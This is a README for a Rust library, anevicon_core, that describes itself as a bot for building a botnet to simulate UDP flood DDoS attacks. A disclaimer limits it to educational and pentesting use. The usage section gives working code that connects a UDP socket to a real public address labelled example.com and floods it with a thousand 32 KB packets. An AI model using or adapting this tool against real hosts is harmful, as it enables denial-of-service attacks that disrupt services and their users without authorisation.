<div align="center">
  <h1>anevicon_core</h2>
  
  <a href="https://gitter.im/Gymmasssorla/anevicon">
    <img src="https://img.shields.io/badge/chat-on%20gitter-pink.svg">
  </a>
  <a href="https://travis-ci.com/Gymmasssorla/anevicon">
    <img src="https://travis-ci.com/Gymmasssorla/anevicon.svg?branch=master">
  </a>
  <a href="https://github.com/Gymmasssorla/anevicon/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/license-GPLv3-blue.svg">
  </a>
  <a href="https://crates.io/crates/anevicon_core">
    <img src="https://img.shields.io/badge/crates.io-v0.2.0-orange.svg">
  </a>
  <a href="https://docs.rs/anevicon_core">
    <img src="https://img.shields.io/badge/docs.rs-link-blue.svg">
  </a>
  <a href="https://semver.org">
    <img src="https://img.shields.io/badge/semver-follows-green.svg">
  </a>
  
  This crate can be used as a bot to build a [botnet](https://en.wikipedia.org/wiki/Botnet) for simulating [UDP-based DDoS attacks](https://en.wikipedia.org/wiki/UDP_flood_attack) (but only for educational and pentesting purposes, see [the GPLv3 license](https://github.com/Gymmasssorla/anevicon/blob/master/LICENSE), under which the library is distributed).
  
This library was designed to be as convenient and reliable as it is possible, and without any external dependencies (except of
the standard library). If you are just interested in one single program, please take a look at [this one](https://docs.rs/anevicon_core/0.1.0/anevicon_core/).
</div>

## Usage

Enter this text to your `Cargo.toml` file:
```toml
[dependencies]
anevicon_core = "*"
```

And this one to your `src/main.rs` source:
```rust
use anevicon_core::summary::TestSummary;
use anevicon_core::testing::execute;

// Setup the socket connected to the example.com domain
let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
socket
    .connect("93.184.216.34:80")
    .expect("Cannot connect the socket to example.com");

let mut summary = TestSummary::default();

// Execute a test that will send one thousand packets
// each containing 32768 bytes.
execute(&socket, &vec![0; 32768], &mut summary)
    .take(1000)
    .for_each(|result| {
        if let Err(error) = result {
            panic!("{}", error);
        }
    });

println!(
    "The total seconds passed: {}", summary.time_passed().as_secs()
);
```
